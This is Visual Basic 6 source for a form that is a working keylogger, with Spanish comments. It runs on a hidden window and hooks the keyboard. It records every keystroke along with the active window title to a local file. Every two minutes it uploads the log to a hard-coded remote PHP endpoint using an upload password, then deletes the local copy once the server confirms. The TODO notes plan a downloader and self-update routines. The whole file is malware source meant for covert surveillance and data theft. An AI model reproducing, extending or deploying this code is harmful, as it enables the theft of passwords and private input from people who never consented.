VERSION 5.00
Begin VB.Form FrmMain 
   Caption         =   "Form1"
   ClientHeight    =   930
   ClientLeft      =   60
   ClientTop       =   390
   ClientWidth     =   1770
   LinkTopic       =   "Form1"
   ScaleHeight     =   930
   ScaleWidth      =   1770
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.Timer CanUpload 
      Interval        =   6000
      Left            =   120
      Top             =   120
   End
   Begin VB.Timer UploaderTimer 
      Interval        =   60000
      Left            =   840
      Top             =   120
   End
End
Attribute VB_Name = "FrmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'TODO's
' - Manejar todos los errores posibles []
' - Hacer un downloader []
' - Rutinas para actualizar el keylogger []
' - Hacer el Uploader, php [x]
' - Hacer un Parser del log file, php []
' - Upload String [x]

Private Declare Function GetKeyboardState Lib "user32" (pbKeyState As Byte) As Long
Private Declare Function ToAscii Lib "user32" (ByVal uVirtKey As Integer, ByVal uScanCode As Integer, ByRef lpbKeyState As Byte, ByRef lpwTransKey As Integer, ByVal fuState As Integer) As Integer
Public WithEvents MyEventRaiser As EventRaiser
Attribute MyEventRaiser.VB_VarHelpID = -1
Public WithEvents SocketUpload As CSocketMaster
Attribute SocketUpload.VB_VarHelpID = -1

Dim PressedControl As Boolean
Dim PressedShift As Boolean
Dim PressedAlt As Boolean
Dim LastTimePressed As Date
Dim Buffer As String, CntVbCrlF As Integer
Dim VentanaActual As String, CanIreloadCSM As Boolean
Dim EnviarCada As Integer, cntMinutes As Integer

Private Sub Form_Load()
    Debug.Print "Iniciando"
    Set MyEventRaiser = New EventRaiser
    Set SocketUpload = New CSocketMaster
    Debug.Print "Objetos Inicializados, CSM y EventRaiser"

    '''''''' <Configurar>  ''''''
    UploadUrl = "http://angelbroz.com/ab/k/kloggyx.php"
    MyLogFile = "C:\status.akl"
    EnviarCada = 2
    'Este viene siendo el campo del archvio que recibimos en kloggyx.php
    ServerUploadPassword = "abupload"
    '''''''' </Configurar> '''''''
    
    Buffer = "                          [ Starting loggin at " & Now & "]"
    Save
    Buffer = ""
    LastTimePressed = Now
    CntVbCrlF = 1
    Hook
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    UnHook
End Sub

Private Sub MyEventRaiser_KBHKeyDown(ByVal vkCode As Integer, ByVal scanCode As Integer, ByVal flags As Integer)
    On Error GoTo ErrHanlder
    Dim CurrentKeyboardState(0 To 255) As Byte
    Dim AsciiCode As Integer
    Dim LineaInicio As String
    LineaInicio = "[" & Now & "]: Window: " & ActiveWindow & vbCrLf & "[" & Format$(Now, "hh:mm:ss AM/PM") & "]: "
    If Buffer = "" And VentanaActual <> ActiveWindow Then
        Buffer = LineaInicio
    ElseIf VentanaActual <> ActiveWindow Then
        If Uploading Then
            Buffer = Buffer & vbCrLf & LineaInicio
            Exit Sub
        End If
        Save
        Buffer = LineaInicio
        CntVbCrlF = 1
    End If
    
    Call GetKeyboardState(CurrentKeyboardState(0))
    
    Dim KeyPressed As String

    Select Case vkCode
        Case vbKeyF1 To vbKeyF12:       KeyPressed = "[F" & (vkCode - (vbKeyF1 - 1)) & "]"
        Case vbKeySpace:                KeyPressed = "[Space]"
        Case vbKeyDelete:               KeyPressed = "[Delete]"
        Case vbKeyInsert:               KeyPressed = "[Insert]"
        Case vbKeyTab:                  KeyPressed = "[Tab]"
        Case vbKeyBack:                 KeyPressed = "[Back]"
        Case vbKeyEscape:               KeyPressed = "[Escape]"
        Case OtrosVK.VK_LWin Or OtrosVK.VK_LWin: KeyPressed = "[Win]"
        Case vbKeyUp:                   KeyPressed = "[Up]"
        Case vbKeyUp:                   KeyPressed = "[Up]"
        Case vbKeyUp:                   KeyPressed = "[Up]"
        Case vbKeyDown:                 KeyPressed = "[Down]"
        Case vbKeyLeft:                 KeyPressed = "[Left]"
        Case vbKeyRight:                KeyPressed = "[Right]"
        Case vbKeyReturn:               KeyPressed = "[Return]"
        Case vbKeyControl, vbKeyShift, OtrosVK.VK_Alt, OtrosVK.VK_LAlt, 160, 161, 165, 162:
        KeyPressed = ""
        Case VK_LWin, VK_RWin:          KeyPressed = "[Win]"
        Case vbKeyCapital
            If (GetKeyState(vbKeyCapital) And KEY_TOGGLED) Then
                KeyPressed = "[CapsOn]"
            Else
                KeyPressed = "[CapsOff]"
            End If
        Case Else
            If ToAscii(vkCode, scanCode, CurrentKeyboardState(0), AsciiCode, 0) = 1 Then
                KeyPressed = Chr(AsciiCode)
            Else
                KeyPressed = "[Unknown:" & vkCode & "]"
            End If
    End Select
    
    Buffer = Buffer & KeyPressed
    
    Dim s As Integer
    s = DateDiff("m", LastTimePressed, Now)
    
    If (Len(Buffer) > (150 * CntVbCrlF) And VentanaActual = ActiveWindow) Or Buffer = "" Then
        Buffer = Buffer & IIf(Buffer = "", "", vbCrLf) & "[" & Format$(Now, "hh:mm:ss AM/PM") & "]: "
        CntVbCrlF = CntVbCrlF + 1
    End If
    
    If s > 30 Or Len(Buffer) > 500 Then
        If Uploading Then GoTo exitIf 'if the socket is uploading we cant clear the buffer
        Save
        Buffer = ""
        CntVbCrlF = 1
    End If
    
exitIf:
    LastTimePressed = Now
    VentanaActual = ActiveWindow
    Exit Sub
ErrHanlder:
    Me.MyEventRaiser.RaiseErrorDetected "Error al recibir el evento KBHKeyDown"
    Err.Clear
End Sub

Private Sub MyEventRaiser_KBHKeyUp(ByVal vkCode As Integer, ByVal scanCode As Integer, ByVal flags As Integer)
    On Error GoTo ErrHanlder
    'sin usarse, pero serviria para usar combinaciones de teclas, mas adelante vere que rollo
    Select Case vkCode
        Case vbKeyControl:                                  PressedControl = False
        Case vbKeyShift:                                    PressedShift = False
        Case OtrosVK.VK_Alt Or OtrosVK.VK_LAlt:             PressedAlt = False
    End Select
    Exit Sub
ErrHanlder:
    Me.MyEventRaiser.RaiseErrorDetected "Error al recibir el evento KBHKeyDown"
    Err.Clear
End Sub

Private Sub MyEventRaiser_ErrorDetected(ByVal ErrStr As String)
    On Error Resume Next ' <---- LOL!!! hahaha
    Dim tmpString As String
    tmpString = "[Error detected: " & Now & " ErrMsg:" & ErrStr & "]"
    Open MyLogFile For Append As #1
        Print #1, tmpString
    Close #1
    Debug.Print tmpString
End Sub

Sub Save()
    On Error Resume Next
    Open MyLogFile For Append As #1
        Print #1, Buffer
    Close #1
End Sub

Private Sub SocketUpload_CloseSck()
    Uploading = False
    Debug.Print "uploading false "
End Sub


Private Sub SocketUpload_DataArrival(ByVal bytesTotal As Long)
    On Error Resume Next
    Dim Data As String
    SocketUpload.GetData Data
    If InStr(1, LCase(Data), "correcto") > 0 Then
        Kill MyLogFile
        Debug.Print "Borrado el log file :)"
    End If
End Sub

Private Sub UploaderTimer_Timer()
    'Entra cada minuto
    cntMinutes = cntMinutes + 1
    Debug.Print "Minuto " & cntMinutes
    If cntMinutes = EnviarCada Then
        UploadLogServer
        Debug.Print "Sending logs to the server :o"
        cntMinutes = 0
    End If
End Sub

Private Sub CanUpload_Timer()
    On Error GoTo ErrHanlder
    If SocketUpload.State = sckConnected Then
        SocketUpload.SendData DatosAEnviar
        DatosAEnviar = ""
        CanIreloadCSM = True
    ElseIf SocketUpload.State = sckClosed And CanIreloadCSM = True Then
        Set SocketUpload = Nothing
        Set SocketUpload = New CSocketMaster
        CanIreloadCSM = False
        Debug.Print "Yay i has a new CSM"
    End If
    Exit Sub
ErrHanlder:
    Me.MyEventRaiser.RaiseErrorDetected "Error al enviar los datos, " & Err.Description
End Sub
